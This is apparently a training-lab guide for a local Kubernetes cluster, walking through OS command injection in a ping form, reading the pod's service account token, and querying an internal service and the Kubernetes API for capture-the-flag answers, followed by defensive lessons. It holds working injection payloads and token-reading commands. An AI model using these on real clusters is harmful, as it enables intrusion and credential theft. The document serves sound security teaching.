# Scenario 02: Kubernetes Pivot

**Difficulty:** Intermediate
**Time estimate:** 60–90 minutes
**OSCP relevance:** Pod enumeration, internal service discovery, service account awareness, cluster-internal lateral movement

---

## Objective

Work through a complete attack chain against a locally hosted Kubernetes cluster. Starting from an external web vulnerability, you will gain a pod-level foothold, enumerate the cluster from inside, discover and reach an internal service not accessible from your host, and use a mounted service account token to query the Kubernetes API.

| Flag | Skills |
|------|--------|
| `FLAG{k8s_web_foothold}` | Pod-level command injection, web enumeration |
| `FLAG{k8s_internal_service}` | Cluster-internal DNS, internal service access via RCE |
| `FLAG{k8s_service_account_discovery}` | Service account token usage, Kubernetes API enumeration |

**V2 total: 80 points.** Submit to Proctor at `http://127.0.0.1:8090`.

---

## Scope and Safety Boundary

**In scope:** All services listed below. All actions must stay local to your workstation.

**Out of scope:** Your host OS beyond the lab ports listed. Any network interface other than loopback. Any real credentials, real hosts, or internet connectivity. Docker Compose services (`forge-web`, `forge-internal`, etc.) — those belong to Scenario 01.

**Safety rules:**
- Do not attempt container escape.
- Do not attempt to reach cluster-admin level access.
- Do not target `forge-proctor`.
- Keep all activity within `127.0.0.1` and the kind cluster's internal network.

---

## Start Conditions

The kind cluster must be running before starting this scenario:

```bash
make kind-up       # creates cluster, builds images, deploys the scenario
make kind-verify   # confirm deployment is healthy before starting
```

Both commands must succeed with no failures. The web app should be reachable at `http://127.0.0.1:18080`.

To confirm the lab is clean before starting:

```bash
make kind-verify
```

---

## Target Services

| Service | Host Address | Accessible From |
|---------|-------------|----------------|
| `forge-k8s-web` | `http://127.0.0.1:18080` | Host (direct, via NodePort) |
| `forge-k8s-internal` | `forge-k8s-internal.forge-k8s.svc.cluster.local:5000` | Inside the cluster only |
| Kubernetes API | `https://kubernetes.default.svc` | Inside the cluster only |

`forge-k8s-internal` has no host-published port. It is a ClusterIP service and is intentionally not reachable from your host. You must use command execution inside the `forge-k8s-web` pod to reach it.

---

## Skills Practiced

- OS command injection in a containerized web application
- Reading environment variables from inside a running pod
- Cluster-internal DNS: `<service>.<namespace>.svc.cluster.local`
- Discovering and reaching a ClusterIP service via pod RCE
- Locating the Kubernetes service account token and CA certificate
- Querying the Kubernetes API using `curl` with a bearer token
- Reading a Kubernetes ConfigMap via the API
- Understanding what service account RBAC scoping means in practice

---

## Operator Perspective

Use an ephemeral operator pod to practice cluster enumeration from inside the network:

```bash
kubectl run forge-operator \
  --image=nicolaka/netshoot \
  --restart=Never \
  -it --rm \
  -n forge-k8s \
  -- bash
```

From inside the operator pod, practice DNS and HTTP reachability to both services before starting the exploit stages. The `--rm` flag removes the pod when you exit.

---

## Proctor Mode

Track your score at `http://127.0.0.1:8090`. Submit each flag as you find it.

V2 flags appear in the Proctor dashboard automatically. If your existing Proctor database pre-dates the V2 update, run:

```bash
make proctor-reset
```

to reseed with V2 flags. This wipes all existing scores and accounts. If you want to preserve V1 scores, rebuild and restart the Proctor container only:

```bash
docker compose stop proctor
docker compose up -d --build proctor
```

The new startup logic adds missing V2 flags without touching existing V1 data.

---

## Stage 0 — External Enumeration

### Objective

Identify all reachable services and enumerate the web application before attempting exploitation.

### Tasks

```bash
# Confirm the web app is up
curl -s http://127.0.0.1:18080/health

# Browse the root
curl -s http://127.0.0.1:18080/
```

The homepage shows a Ping diagnostic form. Observe the pod name and namespace displayed in the page footer.

### What to look for

- The web app listens on `127.0.0.1:18080` (NodePort mapping from the kind cluster)
- The page footer shows the pod name and namespace (`forge-k8s`)
- There is a Ping form that accepts a host input

### Expected Evidence

- HTTP 200 from `http://127.0.0.1:18080/health` returning `{"status": "ok"}`
- Web page with a Ping form and pod/namespace info in the footer

---

## Stage 1 — Kubernetes Web Foothold

### Objective

Gain command execution inside the `forge-k8s-web` pod.

### Background

The Ping form passes user input directly to a shell command without sanitization. Shell metacharacters (`; | && $()`) allow injection of additional commands.

### Test for injection

```bash
curl -X POST http://127.0.0.1:18080/ping -d "host=127.0.0.1"
# Observe: ping output in the response
```

<details>
<summary>Hint 1 (mild)</summary>

The `host` parameter is passed to a shell command. Shell metacharacters that chain commands work here.
</details>

<details>
<summary>Hint 2 (direct)</summary>

```bash
curl -X POST http://127.0.0.1:18080/ping -d "host=127.0.0.1;id"
# Expected: uid=0(root) in the response
```
</details>

### Collect FLAG 1

Once you have RCE, the flag is available from the pod's environment:

```bash
curl -X POST http://127.0.0.1:18080/ping -d "host=127.0.0.1;env"
```

Or directly from the `/flag` endpoint:

```bash
curl -s http://127.0.0.1:18080/flag
```

### Expected Evidence

- `id` command output showing process identity inside the pod
- `FLAG{k8s_web_foothold}` retrieved from the environment or `/flag`

---

## Stage 2 — Pod Enumeration

### Objective

Enumerate the pod's environment to discover internal services and Kubernetes metadata.

### Tasks

From your RCE foothold, run these commands through the Ping injection:

```bash
# Environment variables — look for service URLs, flag values, and namespace info
curl -X POST http://127.0.0.1:18080/ping -d "host=127.0.0.1;env"

# Kubernetes service account token location
curl -X POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"

# Namespace
curl -X POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"

# Cluster DNS — Kubernetes injects service environment variables for services in the same namespace
# Look for FORGE_K8S_INTERNAL_SERVICE_HOST or similar
curl -X POST http://127.0.0.1:18080/ping -d "host=127.0.0.1;env | grep -i forge"
```

### What to look for

- `FLAG_K8S_01` in the environment (confirms you are inside the right pod)
- `/var/run/secrets/kubernetes.io/serviceaccount/` exists — this is the service account mount point
- The namespace is `forge-k8s`
- Environment variables injected by Kubernetes for services in the same namespace

### Expected Evidence

- `FLAG_K8S_01=FLAG{k8s_web_foothold}` in env output
- `token`, `ca.crt`, and `namespace` files in the service account directory
- `forge-k8s` in the namespace file

---

## Stage 3 — Internal Service Discovery

### Objective

Reach `forge-k8s-internal` — a ClusterIP service not directly accessible from your host — and retrieve the internal service flag.

### Background

Kubernetes assigns a stable DNS name to every Service:

```
<service-name>.<namespace>.svc.cluster.local
```

For the internal API:

```
forge-k8s-internal.forge-k8s.svc.cluster.local:5000
```

This name resolves inside the cluster but not from your host. Use your RCE foothold in `forge-k8s-web` to reach it.

<details>
<summary>Hint 1 (mild)</summary>

The internal service is not reachable from your host. From inside the web pod, you can use `curl` to reach cluster-internal DNS names.
</details>

<details>
<summary>Hint 2 (direct)</summary>

Use the command injection to run curl from inside the pod:

```bash
curl -X POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;curl -s http://forge-k8s-internal.forge-k8s.svc.cluster.local:5000/health"
```

Confirm the health endpoint responds, then request `/secret`.
</details>

### Retrieve FLAG 2

The web pod has Python3 and its standard library. Use `urllib.request` to make the request from inside the pod via the command injection:

```bash
curl -X POST http://127.0.0.1:18080/ping --data-urlencode \
  "host=127.0.0.1;python3 -c \"import urllib.request; print(urllib.request.urlopen('http://forge-k8s-internal.forge-k8s.svc.cluster.local:5000/secret').read().decode())\""
```

If the image was built with `curl` available (Dockerfile installs it), you can also use:

```bash
curl -X POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;curl -s http://forge-k8s-internal.forge-k8s.svc.cluster.local:5000/secret"
```

### Expected Evidence

- JSON response from `/secret` containing `FLAG{k8s_internal_service}`
- Confirms that the internal service is reachable from within the pod via cluster DNS

---

## Stage 4 — Service Account Discovery

### Objective

Use the pod's mounted service account token to query the Kubernetes API and retrieve the discovery flag from a ConfigMap.

### Background

Kubernetes automatically mounts a service account token into every pod (unless explicitly disabled). The token is a signed JWT that grants the service account's RBAC permissions. The `forge-k8s-web-sa` service account can read pods and ConfigMaps in the `forge-k8s` namespace.

Service account files are always at:

```
/var/run/secrets/kubernetes.io/serviceaccount/token    — Bearer token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt   — CA certificate for TLS verification
/var/run/secrets/kubernetes.io/serviceaccount/namespace — Current namespace
```

The Kubernetes API is always reachable at `https://kubernetes.default.svc` from inside a pod.

<details>
<summary>Hint 1 (mild)</summary>

Read the token from inside the pod, then use it as a Bearer token in a curl request to the Kubernetes API. Use the CA cert for TLS verification.
</details>

<details>
<summary>Hint 2 (direct)</summary>

Step 1 — Read the token:
```bash
curl -X POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

Step 2 — Query the ConfigMap (copy the token value from step 1):
```bash
TOKEN=$(curl -sX POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  | grep -oP '(?<=<pre>).*(?=</pre>)')
```

Or from a single injected command inside the pod:
```bash
curl -X POST http://127.0.0.1:18080/ping --data-urlencode \
  "host=127.0.0.1;curl -sk --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H \"Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" \
  https://kubernetes.default.svc/api/v1/namespaces/forge-k8s/configmaps/forge-k8s-config"
```
</details>

### Retrieve FLAG 3

The web pod always has Python3. Use its `ssl` and `urllib.request` modules to make the authenticated API call from inside the pod via command injection:

```bash
curl -X POST http://127.0.0.1:18080/ping --data-urlencode \
  'host=127.0.0.1;python3 -c "import urllib.request,ssl,json; SA=\"/var/run/secrets/kubernetes.io/serviceaccount\"; t=open(SA+\"/token\").read(); c=ssl.create_default_context(cafile=SA+\"/ca.crt\"); r=urllib.request.Request(\"https://kubernetes.default.svc/api/v1/namespaces/forge-k8s/configmaps/forge-k8s-config\",headers={\"Authorization\":\"Bearer \"+t}); print(json.loads(urllib.request.urlopen(r,context=c).read())[\"data\"][\"discovery_flag\"])"'
```

If the image was built with `curl` available, an equivalent one-liner:

```bash
curl -X POST http://127.0.0.1:18080/ping --data-urlencode \
  "host=127.0.0.1;TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H \"Authorization: Bearer \$TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/forge-k8s/configmaps/forge-k8s-config"
```

Look for the `discovery_flag` key in the ConfigMap's `data` section.

### Expected Evidence

- JSON response from the Kubernetes API containing the `forge-k8s-config` ConfigMap data
- `discovery_flag: FLAG{k8s_service_account_discovery}` in the ConfigMap `data`

---

## Flags and Evidence

All three flags, collectable in order:

```
FLAG{k8s_web_foothold}              — Stage 1 (/flag endpoint or env via RCE)
FLAG{k8s_internal_service}          — Stage 3 (forge-k8s-internal /secret via RCE)
FLAG{k8s_service_account_discovery} — Stage 4 (Kubernetes API ConfigMap via SA token)
```

Submit each to Proctor at `http://127.0.0.1:8090/submit`.

---

## Walkthrough: Open Only If Stuck

<details>
<summary>Full command sequence — expand only after attempting with hints above</summary>

### Stage 0: Confirm reachability

```bash
curl -s http://127.0.0.1:18080/health
# → {"status":"ok"}

curl -s http://127.0.0.1:18080/
# → HTML page with Ping form; note pod name and namespace in footer
```

### Stage 1: Command injection foothold

```bash
# Confirm injection
curl -X POST http://127.0.0.1:18080/ping -d "host=127.0.0.1;id"
# → uid=0(root) gid=0(root) groups=0(root)

# FLAG 1 — from /flag endpoint
curl -s http://127.0.0.1:18080/flag
# → {"flag":"FLAG{k8s_web_foothold}"}
```

### Stage 2: Pod enumeration

```bash
# Environment variables
curl -X POST http://127.0.0.1:18080/ping -d "host=127.0.0.1;env"
# → ...FLAG_K8S_01=FLAG{k8s_web_foothold}...HOSTNAME=forge-k8s-web-<id>...

# Service account files
curl -X POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
# → ca.crt  namespace  token

# Namespace
curl -X POST http://127.0.0.1:18080/ping \
  -d "host=127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# → forge-k8s
```

### Stage 3: Internal service access

```bash
# FLAG 2 — reach internal service from inside the pod using Python3 urllib
curl -X POST http://127.0.0.1:18080/ping --data-urlencode \
  "host=127.0.0.1;python3 -c \"import urllib.request; print(urllib.request.urlopen('http://forge-k8s-internal.forge-k8s.svc.cluster.local:5000/secret').read().decode())\""
# → {"flag":"FLAG{k8s_internal_service}","service":"forge-k8s-internal"}
```

### Stage 4: Service account API query

```bash
# FLAG 3 — read SA token and query Kubernetes API from inside the pod using Python3 (one-liner)
curl -X POST http://127.0.0.1:18080/ping --data-urlencode \
  'host=127.0.0.1;python3 -c "import urllib.request,ssl,json; SA=\"/var/run/secrets/kubernetes.io/serviceaccount\"; t=open(SA+\"/token\").read(); c=ssl.create_default_context(cafile=SA+\"/ca.crt\"); r=urllib.request.Request(\"https://kubernetes.default.svc/api/v1/namespaces/forge-k8s/configmaps/forge-k8s-config\",headers={\"Authorization\":\"Bearer \"+t}); print(json.loads(urllib.request.urlopen(r,context=c).read())[\"data\"][\"discovery_flag\"])"'
# → FLAG{k8s_service_account_discovery}
```

</details>

---

## Defensive Lessons

| Vulnerability | Root Cause | Correct Fix |
|---------------|-----------|-------------|
| OS command injection (`/ping`) | `shell=True` with unsanitized input | Use `subprocess.run([...], shell=False)` with an argument list |
| Flag in environment variable | Sensitive data in plaintext env var | Use Kubernetes Secrets (base64-encoded, access-controlled); never hardcode in Deployment env |
| Unauthenticated internal endpoint (`/secret`) | No access control on internal API | Require authentication even for cluster-internal services; defense-in-depth |
| Discovery flag in ConfigMap | Sensitive data in ConfigMap | Store secrets in Kubernetes Secrets, not ConfigMaps; restrict RBAC to the minimum needed |
| Service account RBAC grants ConfigMap read | Over-broad service account permissions | Apply least-privilege: only grant the specific permissions the application actually needs, to the specific resources it needs |
| Service account auto-mounted | Default Kubernetes behavior | Set `automountServiceAccountToken: false` on pods that do not need API access |

### Key Takeaways

1. **Command injection is equally dangerous in Kubernetes.** A pod running a vulnerable app has the same OS command injection risks as a Docker container or bare-metal host. Containers do not eliminate web vulnerabilities.

2. **Cluster-internal services are not automatically safe.** A service with `type: ClusterIP` is invisible from the host network, but an attacker with RCE inside the cluster can reach it. Defense-in-depth requires authentication on all internal services.

3. **Service account tokens are credentials.** Every pod that auto-mounts a service account token is carrying a Kubernetes API credential. Scope them narrowly and disable mounting when not needed.

4. **ConfigMaps are not Secrets.** ConfigMaps are not encrypted at rest and are accessible to anything with RBAC `get`/`list` permissions. Store sensitive values in Kubernetes Secrets (or an external secret manager).

---

## Reset Steps

After completing the scenario, restore to a clean state:

```bash
make reset-kind    # destroy the kind cluster
make kind-up       # recreate cluster and redeploy scenario
make kind-verify   # confirm clean state
```

To reset only the Proctor scores between runs:

```bash
make proctor-reset
```

To reset everything (Docker Compose + kind):

```bash
make reset-all
```
